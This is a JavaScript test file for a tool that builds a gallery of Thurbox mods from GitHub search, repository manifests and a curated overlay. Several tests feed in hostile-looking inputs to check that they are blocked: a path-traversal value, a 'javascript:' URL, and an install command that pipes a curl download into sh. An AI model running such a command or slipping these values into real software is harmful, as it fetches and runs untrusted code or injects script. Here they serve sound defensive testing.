import assert from 'node:assert/strict';
import { test } from 'node:test';
import { readFile } from 'node:fs/promises';
import {
  SEARCH_QUERY,
  collectGallery,
  loadGallery,
  validateGallery,
} from './mods-gallery.mjs';
import { validateOverlay } from './validate-mods.mjs';

const API = 'https://api.github.com';
const RAW = 'https://raw.githubusercontent.com';

const repository = (fullName, extra = {}) => ({
  full_name: fullName,
  name: fullName.split('/')[1],
  owner: { login: fullName.split('/')[0] },
  html_url: `https://github.com/${fullName}`,
  description: `${fullName} <b>description</b>`,
  stargazers_count: 3,
  pushed_at: '2026-11-20T10:00:00Z',
  created_at: '2026-09-01T10:00:00Z',
  default_branch: 'main',
  topics: ['thurbox', 'thurbox-mods'],
  fork: false,
  archived: false,
  private: false,
  ...extra,
});

const official = repository('Thurbeen/thurbox-alpha', { stargazers_count: 9 });
const community = repository('alice/thurbox-beta', { default_branch: 'trunk' });
const spam = repository('spam/thurbox-ads');
const fork = repository('copycat/thurbox-alpha', { fork: true });
const untagged = repository('bob/thurbox-gamma', { topics: [] });

const curated = [
  {
    repo: 'https://github.com/bob/thurbox-gamma',
    install: 'git clone https://github.com/bob/thurbox-gamma\nmake install',
    platforms: ['Linux'],
    notes: 'Needs make.',
  },
  { repo: 'https://github.com/alice/thurbox-beta', notes: 'Curated note.' },
  { repo: 'https://github.com/spam/thurbox-ads', hidden: true },
];

const alphaManifest = `
name = "alpha"
description = "Alpha from its manifest"
version = "v1.2.0"
requires_thurbox = ">=3.24.0"
pane = { source = "alpha.lua", path = "mods/40_alpha.lua" }

[gallery]
media = "docs/shot.png"
media_alt = "Alpha in a pane"
platforms = ["Linux", "macOS"]
notes = "Grant run."
`;

const gammaManifest = `
name = "gamma"
version = "0.1.0"
requires_thurbox = ">=3.0.0"
pane = { source = "g.lua", path = "mods/50_g.lua" }

[gallery]
install = "thurbox-cli mod install ignored-because-curated"
`;

function response(status, body) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: new Headers(),
    json: async () => body,
    text: async () => (typeof body === 'string' ? body : JSON.stringify(body)),
  };
}

function githubMock(overrides = {}) {
  const calls = [];
  const routes = {
    [`${API}/repos/bob/thurbox-gamma`]: () => response(200, untagged),
    [`${RAW}/Thurbeen/thurbox-alpha/main/mod.toml`]: () => response(200, alphaManifest),
    [`${RAW}/alice/thurbox-beta/trunk/mod.toml`]: () => response(404, 'Not Found'),
    [`${RAW}/alice/thurbox-beta/trunk/media/demo.gif`]: () => response(200, ''),
    [`${RAW}/bob/thurbox-gamma/main/mod.toml`]: () => response(200, gammaManifest),
    [`${RAW}/bob/thurbox-gamma/main/media/demo.gif`]: () => response(404, ''),
    ...overrides,
  };
  const request = async (url, init = {}) => {
    calls.push({ url: String(url), init });
    const parsed = new URL(url);
    if (parsed.origin + parsed.pathname === `${API}/search/repositories`) {
      const route = routes.search;
      if (route) return route(parsed);
      return response(200, {
        total_count: 4,
        incomplete_results: false,
        items: [official, community, spam, fork],
      });
    }
    const route = routes[String(url)];
    if (!route) throw new Error(`unexpected request ${url}`);
    return route(parsed);
  };
  return { request, calls };
}

test('discovers repositories by topic, merges mod.toml and the curated overlay', async () => {
  const { request, calls } = githubMock();
  const gallery = await collectGallery({ curated, request, token: 'secret-token' });

  const search = new URL(calls.find((c) => c.url.includes('/search/repositories')).url);
  assert.equal(search.searchParams.get('q'), SEARCH_QUERY);
  assert.match(SEARCH_QUERY, /\btopic:thurbox-mods\b/);
  for (const call of calls.filter((c) => c.url.startsWith(API)))
    assert.equal(call.init.headers.Authorization, 'Bearer secret-token');
  for (const call of calls.filter((c) => c.url.startsWith(RAW)))
    assert.equal(call.init.headers?.Authorization, undefined, 'the token stays with the API');

  assert.deepEqual(
    gallery.map((m) => m.fullName),
    ['Thurbeen/thurbox-alpha', 'alice/thurbox-beta', 'bob/thurbox-gamma'],
  );
  const [alpha, beta, gamma] = gallery;

  assert.equal(alpha.official, true);
  assert.equal(alpha.name, 'thurbox-alpha');
  assert.equal(alpha.owner, 'Thurbeen');
  assert.equal(alpha.repo, 'https://github.com/Thurbeen/thurbox-alpha');
  assert.equal(alpha.description, 'Thurbeen/thurbox-alpha <b>description</b>');
  assert.equal(alpha.stars, 9);
  assert.equal(alpha.pushedAt, '2026-11-20T10:00:00Z');
  assert.deepEqual(alpha.topics, ['thurbox']);
  assert.equal(alpha.version, 'v1.2.0');
  assert.equal(alpha.requiresThurbox, '>=3.24.0');
  assert.equal(alpha.install, 'thurbox-cli mod install git+https://github.com/Thurbeen/thurbox-alpha');
  assert.deepEqual(alpha.platforms, ['Linux', 'macOS']);
  assert.equal(alpha.notes, 'Grant run.');
  assert.deepEqual(alpha.media, {
    url: `${RAW}/Thurbeen/thurbox-alpha/main/docs/shot.png`,
    alt: 'Alpha in a pane',
  });
  assert.equal(alpha.tagged, true);

  assert.equal(beta.official, false);
  assert.equal(beta.notes, 'Curated note.');
  assert.deepEqual(beta.platforms, []);
  assert.equal(beta.version, null);
  assert.deepEqual(beta.media, {
    url: `${RAW}/alice/thurbox-beta/trunk/media/demo.gif`,
    alt: 'thurbox-beta in the Thurbox interface',
  });

  assert.equal(gamma.tagged, false, 'a curated repository is listed without the topic');
  assert.equal(gamma.install, curated[0].install, 'curated metadata wins over mod.toml');
  assert.equal(gamma.description, 'bob/thurbox-gamma <b>description</b>');
  assert.equal(gamma.media, null);
  assert.deepEqual(validateGallery(gallery), []);
});

test('a repository description falls back to its mod.toml description', async () => {
  const { request } = githubMock({
    search: () =>
      response(200, {
        total_count: 1,
        incomplete_results: false,
        items: [{ ...official, description: null }],
      }),
  });
  const [alpha] = await collectGallery({ curated: [], request });
  assert.equal(alpha.description, 'Alpha from its manifest');
});

test('media in mod.toml must stay inside the repository or be HTTPS', async () => {
  for (const media of ['../../../evil/x.png', 'http://example.com/x.png', 'javascript:x']) {
    const { request } = githubMock({
      [`${RAW}/Thurbeen/thurbox-alpha/main/mod.toml`]: () =>
        response(200, alphaManifest.replace('docs/shot.png', media)),
      [`${RAW}/Thurbeen/thurbox-alpha/main/media/demo.gif`]: () => response(404, ''),
      search: () =>
        response(200, { total_count: 1, incomplete_results: false, items: [official] }),
    });
    const [alpha] = await collectGallery({ curated: [], request });
    assert.equal(alpha.media, null, media);
  }
});

test('a malformed mod.toml does not drop the repository', async () => {
  const { request } = githubMock({
    [`${RAW}/Thurbeen/thurbox-alpha/main/mod.toml`]: () => response(200, 'name = [oops'),
    [`${RAW}/Thurbeen/thurbox-alpha/main/media/demo.gif`]: () => response(404, ''),
    search: () => response(200, { total_count: 1, incomplete_results: false, items: [official] }),
  });
  const [alpha] = await collectGallery({ curated: [], request });
  assert.equal(alpha.fullName, 'Thurbeen/thurbox-alpha');
  assert.equal(alpha.version, null);
});

test('search pages until every repository is collected', async () => {
  const many = Array.from({ length: 130 }, (_, i) => repository(`owner${i}/thurbox-m${i}`));
  const routes = {
    search: (url) => {
      const page = Number(url.searchParams.get('page'));
      const size = Number(url.searchParams.get('per_page'));
      return response(200, {
        total_count: many.length,
        incomplete_results: false,
        items: many.slice((page - 1) * size, page * size),
      });
    },
  };
  for (const r of many) {
    routes[`${RAW}/${r.full_name}/main/mod.toml`] = () => response(404, '');
    routes[`${RAW}/${r.full_name}/main/media/demo.gif`] = () => response(404, '');
  }
  const { request } = githubMock(routes);
  const gallery = await collectGallery({ curated: [], request });
  assert.equal(gallery.length, many.length);
});

test('a failed or rate-limited fetch falls back to the committed snapshot', async () => {
  const snapshot = [{ fullName: 'snap/shot' }];
  const failures = {
    'rate limit': { search: () => response(403, { message: 'API rate limit exceeded' }) },
    'incomplete search': {
      search: () => response(200, { total_count: 9, incomplete_results: true, items: [] }),
    },
    'curated repository unreachable': {
      [`${API}/repos/bob/thurbox-gamma`]: () => response(502, {}),
    },
    'network down': {
      search: () => {
        throw new Error('ECONNRESET');
      },
    },
  };
  for (const [name, overrides] of Object.entries(failures)) {
    const { request } = githubMock(overrides);
    const warnings = [];
    const gallery = await loadGallery({
      curated,
      snapshot,
      request,
      env: {},
      warn: (m) => warnings.push(m),
    });
    assert.deepEqual(gallery, snapshot, name);
    assert.equal(warnings.length, 1, name);
  }
});

test('a curated repository that no longer exists is skipped, not a failure', async () => {
  const { request } = githubMock({ [`${API}/repos/bob/thurbox-gamma`]: () => response(404, {}) });
  const gallery = await loadGallery({ curated, snapshot: [], request, env: {}, warn: () => {} });
  assert.deepEqual(
    gallery.map((m) => m.fullName),
    ['Thurbeen/thurbox-alpha', 'alice/thurbox-beta'],
  );
});

test('offline builds read the snapshot without touching the network', async () => {
  const snapshot = [{ fullName: 'snap/shot' }];
  const request = async () => assert.fail('no request offline');
  const gallery = await loadGallery({
    curated,
    snapshot,
    request,
    env: { THURBOX_GALLERY_OFFLINE: '1' },
    warn: () => {},
  });
  assert.deepEqual(gallery, snapshot);
});

test('the token comes from GITHUB_TOKEN or GH_TOKEN', async () => {
  for (const env of [{ GITHUB_TOKEN: 'a' }, { GH_TOKEN: 'a' }]) {
    const { request, calls } = githubMock();
    await loadGallery({ curated, snapshot: [], request, env, warn: () => {} });
    assert.equal(calls[0].init.headers.Authorization, 'Bearer a');
  }
});

test('the committed snapshot is valid and lists every curated repository', async () => {
  const snapshot = JSON.parse(await readFile('website/mods-snapshot.json', 'utf8'));
  const registry = JSON.parse(await readFile('website/_data/mods.json', 'utf8'));
  assert.deepEqual(validateGallery(snapshot), []);
  assert.deepEqual(validateOverlay(registry), []);
  const listed = new Set(snapshot.map((m) => m.repo.toLowerCase()));
  for (const entry of registry.filter((e) => !e.hidden))
    assert.ok(listed.has(entry.repo.toLowerCase()), entry.repo);
  assert.ok(snapshot.some((m) => m.official));
});

test('repository requests run a few at a time', async () => {
  const many = Array.from({ length: 40 }, (_, i) => repository(`owner${i}/thurbox-m${i}`));
  let inFlight = 0;
  let peak = 0;
  const request = async (url) => {
    const parsed = new URL(url);
    if (parsed.pathname === '/search/repositories')
      return response(200, { total_count: many.length, incomplete_results: false, items: many });
    inFlight += 1;
    peak = Math.max(peak, inFlight);
    await new Promise((resolve) => setImmediate(resolve));
    inFlight -= 1;
    return response(404, '');
  };
  const gallery = await collectGallery({ curated: [], request });
  assert.equal(gallery.length, many.length);
  assert.ok(peak <= 8, `peak concurrency ${peak}`);
});

test('a repository GitHub reports without a push or star count still renders', async () => {
  const { request } = githubMock({
    search: () =>
      response(200, {
        total_count: 1,
        incomplete_results: false,
        items: [{ ...official, pushed_at: null, stargazers_count: undefined }],
      }),
  });
  const gallery = await collectGallery({ curated: [], request });
  assert.equal(gallery[0].pushedAt, official.created_at);
  assert.equal(gallery[0].stars, 0);
  assert.deepEqual(validateGallery(gallery), []);
});

test('the snapshot fallback follows the current overlay', async () => {
  const snapshot = [
    { fullName: 'spam/thurbox-ads', repo: 'https://github.com/spam/thurbox-ads', install: 'x' },
    {
      fullName: 'bob/thurbox-gamma',
      repo: 'https://github.com/bob/thurbox-gamma',
      install: 'old install',
      platforms: [],
      notes: null,
      media: null,
    },
    { fullName: 'carol/other', repo: 'https://github.com/carol/other', install: 'kept' },
  ];
  const offline = await loadGallery({
    curated,
    snapshot,
    request: async () => assert.fail('no request offline'),
    env: { THURBOX_GALLERY_OFFLINE: '1' },
    warn: () => {},
  });
  const { request } = githubMock({ search: () => response(403, {}) });
  const failed = await loadGallery({ curated, snapshot, request, env: {}, warn: () => {} });
  for (const gallery of [offline, failed]) {
    assert.deepEqual(
      gallery.map((m) => m.fullName),
      ['bob/thurbox-gamma', 'carol/other'],
      'a hidden repository stays hidden',
    );
    assert.equal(gallery[0].install, curated[0].install);
    assert.deepEqual(gallery[0].platforms, ['Linux']);
    assert.equal(gallery[0].notes, 'Needs make.');
    assert.equal(gallery[1].install, 'kept');
  }
});

test('a renamed repository in the overlay is listed once, with its overlay', async () => {
  const renamed = repository('bob/thurbox-gamma-renamed');
  const { request } = githubMock({
    search: () =>
      response(200, { total_count: 1, incomplete_results: false, items: [renamed] }),
    [`${API}/repos/bob/thurbox-gamma`]: () => response(200, renamed),
    [`${RAW}/bob/thurbox-gamma-renamed/main/mod.toml`]: () => response(404, ''),
    [`${RAW}/bob/thurbox-gamma-renamed/main/media/demo.gif`]: () => response(404, ''),
  });
  const gallery = await collectGallery({ curated: [curated[0]], request });
  assert.deepEqual(
    gallery.map((m) => m.fullName),
    ['bob/thurbox-gamma-renamed'],
  );
  assert.equal(gallery[0].install, curated[0].install);
  assert.equal(gallery[0].notes, 'Needs make.');
});

test('only an official mod.toml can set the install command', async () => {
  const withInstall = '[gallery]\ninstall = "curl https://example.com/x | sh"\n';
  const { request } = githubMock({
    [`${RAW}/alice/thurbox-beta/trunk/mod.toml`]: () => response(200, withInstall),
    [`${RAW}/Thurbeen/thurbox-alpha/main/mod.toml`]: () => response(200, withInstall),
    [`${RAW}/Thurbeen/thurbox-alpha/main/media/demo.gif`]: () => response(404, ''),
  });
  const gallery = await collectGallery({ curated: [curated[2]], request });
  const byName = Object.fromEntries(gallery.map((m) => [m.fullName, m]));
  assert.equal(
    byName['alice/thurbox-beta'].install,
    'thurbox-cli mod install git+https://github.com/alice/thurbox-beta',
  );
  assert.equal(byName['Thurbeen/thurbox-alpha'].install, 'curl https://example.com/x | sh');
});
